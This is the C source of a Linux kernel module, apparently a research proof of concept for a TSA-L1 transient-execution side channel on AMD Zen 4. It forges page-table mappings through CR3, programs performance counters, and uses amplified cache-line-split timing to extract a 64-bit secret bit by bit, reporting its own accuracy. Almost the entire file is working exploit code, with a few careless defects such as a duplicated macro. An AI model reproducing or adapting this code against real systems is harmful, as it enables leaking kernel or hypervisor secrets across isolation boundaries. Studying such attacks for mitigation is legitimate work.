/*
 * tsa.c
 *
 *   Extraction Kernel Module with Manual Page Table Manipulation.
 * - Executes in Ring-0, pinned to Core 0.
 * - Uses direct CR3/PML5 manipulation to forge virtual-to-physical mappings.
 * - Cache-Line Split amplification via LODSQ.
 * - Iterates through top XXX candidate PMCs for extraction.
 * - A-B-B-A Swapped execution order to prevent pipeline warm-up bias.
 * - Min-Floor evaluation.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sort.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/sched.h>     /* Required for cond_resched() */
#include <linux/irqflags.h>  /* Required for local_irq_save() */
#include <asm/processor.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/io.h>
#include <asm/msr.h>         /* Required for wrmsrl and rdmsr */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TSA Researcher");

/* ------------------------------------------------------------------ */
/* Zen 4 Performance Counter Configuration                            */
/* ------------------------------------------------------------------ */
#define MSR_ZEN4_PERF_CTL0 0xC0010200
#define MSR_ZEN4_PERF_CTR0 0xC0010201

struct pmc_candidate {
    int event;
    int umask;
};

/* * The Refined Golden Candidates (> 27 cycles) 
 * Prioritizing the PMCs that achieved 100% extraction accuracy.
 */
static const struct pmc_candidate candidates[] = {
    {0xD2, 0x24},
    {0xD2, 0x57},
    {0xD2, 0x8A}
};
#define NUM_CANDIDATES (sizeof(candidates) / sizeof(candidates[0]))
#define NUM_CANDIDATES (sizeof(candidates) / sizeof(candidates[0]))

/* ------------------------------------------------------------------ */
/* Configuration (Fill in your target VAs here)                       */
/* ------------------------------------------------------------------ */
#define BASE_VA      0xFF00000000000000ull

#define PAGE_OFFSET_CACHED 0x610

static uint64_t PHYS_BASE = 0;
static uint64_t VICTIM_VA = 0;
static uint64_t ATTACK_VA = 0;
static uint64_t SECRET_VALUE = 0;

#define CONTROL_VA   (BASE_VA + 0x0000700000001000ULL)
#define CHASE_VA     (BASE_VA + 0x0000700000002000ULL)

#define MAP_SIZE           4096
#define N_SECRET_BITS      64
#define SWEEP_PROBES       500

/* ------------------------------------------------------------------ */
/* User-Provided Page Table Manipulation Snippet                      */
/* ------------------------------------------------------------------ */
#define PAGE_PRESENT 0x1
#define PAGE_RW 0x2
#define PAGE_USER 0x4
#define PAGE_SIZE_4K 4096

static inline unsigned long read_cr3(void) {
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr, u64 addtional_pte_flags) {
    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
    unsigned long index5, index4, index3, index2, index1;
    
    pml5 = (unsigned long *)__va(read_cr3() & ~0xFFFull);
    
    index5 = (virt_addr >> 48) & 0x1FF;
    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!pml5[index5]) {
        pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
    if (!pml4[index4]) {
        pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
    if (!pdp[index3]) {
        pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
    if (!pd[index2]) {
        pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
    if (!pt[index1]) {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    } else {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    }

    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
}

/* ------------------------------------------------------------------ */
/* Low-level CPU primitives                                           */
/* ------------------------------------------------------------------ */
static inline void mfence_lfence(void) {
    __asm__ volatile("mfence\nlfence" : : : "memory");
}

/* ------------------------------------------------------------------ */
/* Gadget D2 — IDIV Cache-Line Split Latency                          */
/* ------------------------------------------------------------------ */
static noinline __aligned(4096) uint64_t probe_D2(volatile uint8_t *victim, 
                         volatile uint8_t *target, 
                         uint64_t bit_idx,
                         volatile uint64_t *chase_head) 
{
    uint64_t elapsed;
    unsigned long flags;
    
    local_irq_save(flags);
    
    asm volatile("sfence" ::: "memory");
    __asm__ volatile("movq (%0),%%rax\n\t" "lfence\n\t"::"r"(chase_head):"rax","memory");
    __asm__ volatile("movq (%0),%%rax\n\t" "lfence\n\t"::"r"(chase_head+128):"rax","memory");
    
    mfence_lfence();
    mfence_lfence();
    asm volatile("invlpg (%0)" ::"r"((uint8_t *)((u64)target & PAGE_MASK)) : "memory");
    
    //__asm__ volatile("movq (%0),%%rax"::"r"(victim):"rax","memory");

    if(victim)
    {
       __asm__ volatile("movq (%0),%%rax"::"r"(victim):"rax","memory");
    }else{
        __asm__ volatile("vmsave %0" :: "a"(PHYS_BASE) : "memory");
    }
   

    __asm__ volatile(
        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"
        
        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"    
        
        "movq (%[tgt]), %%r9\n\t"   
        "shrq %%cl, %%r9\n\t"       
        "andq $1, %%r9\n\t"

        /* AMPLIFICATION: Conditional Cache-Line Split via LODSQ */
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept 20\n\t"
        "movq %%r10, %%rsi\n\t"
        "addq %%r9, %%rsi\n\t"
        "lodsq\n\t"
        "addq %%rax, %%r12\n\t"
        ".endr\n\t"

        "movq 128(%[chase]), %%rax\n\t"
        "addq %%rax, %%r13\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t" 
        "orq %%r11,%%r8\n\t" 
        
        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"
        
        : "=&a"(elapsed)
        : [tgt]"r"(target), [bit]"r"(bit_idx), [chase]"r"(chase_head)
        : "rcx","rdx","rsi","r8","r9","r10","r11","r12","r13","memory");
        
    local_irq_restore(flags);
    return elapsed;
}

/* ------------------------------------------------------------------ */
/* Kernel Filter Engine with Min Tracking                             */
/* ------------------------------------------------------------------ */
typedef struct {
    uint64_t min;
} filter_res_t;

typedef struct {
    uint64_t min0;
    uint64_t min1;
    uint64_t threshold_min;
} calib_t;

static int cmp_u64(const void *a, const void *b) {
    uint64_t va = *(const uint64_t*)a, vb = *(const uint64_t*)b;
    if (va > vb) return 1;
    if (va < vb) return -1;
    return 0;
}

static filter_res_t filter_array_stats(uint64_t *times, int count) {
    filter_res_t res = {0};
    sort(times, count, sizeof(uint64_t), cmp_u64, NULL);
    res.min = times[0];
    return res;
}

/* ------------------------------------------------------------------ */
/* Sweep Logic & Calibration                                          */
/* ------------------------------------------------------------------ */
static void fast_measure_interleaved_swapped(volatile uint8_t *victim, volatile uint8_t *target, 
                                             volatile uint64_t *chase, uint64_t *times0, uint64_t *times1,
                                             filter_res_t *res0, filter_res_t *res1) 
{
    int i;
    for (i = 0; i < SWEEP_PROBES; i += 2) {
        *(volatile uint32_t*)victim = 0;
        times0[i] = probe_D2(victim, target, 0, chase);
        
        *(volatile uint32_t*)victim = 0xffffffff;
        times1[i] = probe_D2(victim, target, 0, chase);
        
        if (i + 1 < SWEEP_PROBES) {
            *(volatile uint32_t*)victim = 0xffffffff;
            times1[i+1] = probe_D2(victim, target, 0, chase);
            
            *(volatile uint32_t*)victim = 0;
            times0[i+1] = probe_D2(victim, target, 0, chase);
        }
    }

    *res0 = filter_array_stats(times0, SWEEP_PROBES);
    *res1 = filter_array_stats(times1, SWEEP_PROBES);
}

static calib_t run_test_case(volatile uint8_t *victim, volatile uint8_t *target, 
                             volatile uint64_t *chase) 
{
    calib_t cal = {0};
    filter_res_t res0, res1;
    uint64_t *times0 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    uint64_t *times1 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));

    if (!times0 || !times1) {
        pr_err("vmalloc failed\n");
        if (times0) vfree(times0);
        if (times1) vfree(times1);
        return cal;
    }
    
    fast_measure_interleaved_swapped(victim, target, chase, times0, times1, &res0, &res1);
    
    cal.min0 = res0.min;
    cal.min1 = res1.min;
    cal.threshold_min = (cal.min0 + cal.min1) / 2;

    pr_info("    Calibration -> b0_min: %llu | b1_min: %llu | threshold: %llu\n", cal.min0, cal.min1, cal.threshold_min);
    
    vfree(times0);
    vfree(times1);
    return cal;
}

/* ------------------------------------------------------------------ */
/* Extraction Logic                                                   */
/* ------------------------------------------------------------------ */
static filter_res_t measure_single_bit_stats(volatile uint8_t *victim, volatile uint8_t *target, 
                                             uint64_t bit_idx, volatile uint64_t *chase) 
{
    int i;
    filter_res_t res = {0};
    uint64_t *times = vmalloc(SWEEP_PROBES * sizeof(uint64_t));

    if (!times) { pr_err("vmalloc failed\n"); return res; }

    for (i = 0; i < SWEEP_PROBES; i++) {
        times[i] = probe_D2(victim, target, bit_idx, chase);
    }

    res = filter_array_stats(times, SWEEP_PROBES);
    vfree(times);
    return res;
}

static void run_extraction(volatile uint8_t *victim, volatile uint8_t *target, 
                           volatile uint64_t *chase, const calib_t *cal) 
{
    uint64_t secret = SECRET_VALUE;
    int b, correct = 0;
    uint64_t predicted_word = 0;

    mfence_lfence();

    for (b = 0; b < N_SECRET_BITS; b++) {
        int true_bit = (secret >> b) & 1;
        int pred_bit;
        filter_res_t res = measure_single_bit_stats(victim, target, b, chase);

        if (cal->min0 < cal->min1) {
            pred_bit = (res.min > cal->threshold_min) ? 1 : 0;
        } else {
            pred_bit = (res.min > cal->threshold_min) ? 0 : 1;
        }

        if (pred_bit == true_bit)
            correct++;

        if (pred_bit)
            predicted_word |= (1ULL << b);
    }

    pr_info(" => Secret: 0x%016llx | Predicted: 0x%016llx | Correct: %d / %d\n",
            (unsigned long long)secret,
            (unsigned long long)predicted_word,
            correct, N_SECRET_BITS);
}

/* ------------------------------------------------------------------ */
/* Main Kernel Thread Wrapper                                         */
/* ------------------------------------------------------------------ */
static struct task_struct *tsa_thread;

static int kthread_tsa_main(void *data) {
    volatile uint8_t *victim = (volatile uint8_t *)VICTIM_VA;
    volatile uint8_t *attack = (volatile uint8_t *)ATTACK_VA;
    volatile uint8_t *control = (volatile uint8_t *)CONTROL_VA;
    volatile uint8_t *chase_region = (volatile uint8_t *)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    int i;
    calib_t attack_cal;

    pr_info("============================================================\n");
    pr_info("  TSA-L1 D2 Kernel Extractor (PMC Candidate Iteration)\n");
    pr_info("============================================================\n");


    void* buff = kmalloc(PAGE_SIZE * 5, GFP_KERNEL);
    void* buff1 = kmalloc(PAGE_SIZE * 5, GFP_KERNEL);
    pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n", (uint64_t)buff);
    
    map_physical_to_virtual(virt_to_phys(buff1) + 0x1000, VICTIM_VA, 0);
    map_physical_to_virtual(virt_to_phys(buff1) + 0x2000, ATTACK_VA, 0);

    map_physical_to_virtual(virt_to_phys(buff), CONTROL_VA, 0);
    map_physical_to_virtual((uint8_t*)virt_to_phys(buff) + 0x3000, CHASE_VA, 0);
    map_physical_to_virtual((uint8_t*)virt_to_phys(buff) + 0x4000, CHASE_VA + MAP_SIZE, 0);

    memset((void*)attack, 0xFF, MAP_SIZE); 
    memset((void*)control, 0xFF, MAP_SIZE);

    chase1 = (uint64_t*)chase_region;
    chase2 = (uint64_t*)(chase_region + MAP_SIZE);
    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    pr_info("\n[+] COMMENCING ITERATION OVER %ld CANDIDATE PMCs\n", NUM_CANDIDATES);
    pr_info("    --------------------------------------------------------------\n");

    for (i = 0; i < NUM_CANDIDATES; i++) {
        uint64_t config = (1ULL << 22) | (1ULL << 17) | (1ULL << 16) | (candidates[i].umask << 8) | candidates[i].event;
        
        wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
        wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
        wrmsrl(MSR_ZEN4_PERF_CTL0, config);

        pr_info("\n--- Testing PMC [E: 0x%02X | U: 0x%02X] ---\n", candidates[i].event, candidates[i].umask);
        
        attack_cal = run_test_case(victim, attack, chase1);
        
        if (attack_cal.min0 != attack_cal.min1) {
            run_extraction(0, attack + PAGE_OFFSET_CACHED, chase1, &attack_cal);
        } else {
            pr_info("    [-] Skipping Extraction: Calibration minimums are identical (No signal).\n");
        }
        
        cond_resched(); 
    }

    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
    pr_info("\n[+] PMC Candidate Iteration Complete.\n");
    kfree(buff);
    kfree(buff1);
    return 0;
}

static int __init tsa_init(void) {
    pr_info("TSA-L1 Module Loaded.\n");
    tsa_thread = kthread_create(kthread_tsa_main, NULL, "tsa_worker");

    uint64_t mask =
        (1ULL << 13) | (1ULL << 26) |   // u1
        (1ULL << 14) | (1ULL << 25);    // u2


    void* buff = kmalloc(PAGE_SIZE, GFP_KERNEL);

    PHYS_BASE = virt_to_phys(buff);
    asm volatile("vmsave %0" :: "a"(PHYS_BASE) : "memory");
    
    SECRET_VALUE = *(uint64_t *)(buff + PAGE_OFFSET_CACHED);

    VICTIM_VA = BASE_VA + PHYS_BASE;
    ATTACK_VA = BASE_VA + PHYS_BASE ^ mask;

    pr_info("    [*] Reserved Physical Base: 0x%llx\n", PHYS_BASE);
    pr_info("    [*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
    pr_info("    [*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
    pr_info("    [*] Secret Value: 0x%016llx\n", SECRET_VALUE);

    if (IS_ERR(tsa_thread)) {
        pr_err("Failed to create kthread.\n");
        return PTR_ERR(tsa_thread);
    }
    
    kthread_bind(tsa_thread, 0);
    wake_up_process(tsa_thread);
    
    kfree(buff);
    return 0;
}

static void __exit tsa_exit(void) {
    pr_info("TSA-L1 Module Unloaded.\n");
}

module_init(tsa_init);
module_exit(tsa_exit);
